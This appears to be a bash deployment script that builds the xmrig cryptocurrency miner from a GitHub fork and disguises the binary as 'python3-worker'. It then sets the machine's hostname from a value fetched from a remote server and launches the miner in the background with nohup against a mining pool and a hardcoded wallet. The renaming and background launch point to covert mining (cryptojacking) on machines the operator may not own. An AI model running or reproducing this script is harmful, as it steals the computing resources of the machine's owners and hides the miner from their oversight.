#!/bin/bash
sudo apt update -y
sudo apt upgrade -y
sudo apt install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev libnuma-dev git -y
sudo apt install software-properties-common -y
sudo apt install cmake libuv1-dev libssl-dev libhwloc-dev libtool autoconf
sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test
sudo apt install -y gcc-11 g++-11 -y
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 11
sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 11
git clone https://github.com/ricoblanco/xmrig.git
mkdir /work
cd xmrig
mkdir build
cd build
cmake ..
make -j$(nproc)
mv xmrig /work/python3-worker
cd ../../
rm -rf xmrig
newh=`curl http://luckpower.xyz/srv2.php`
hostname $newh
hs=`hostname`
cd /work
nohup ./python3-worker -a gr -o pool.luckpower.xyz:3008 -u RPDtBeuUD2a1pxBHLHHJ5dPyYkinAk4sox.$hs &
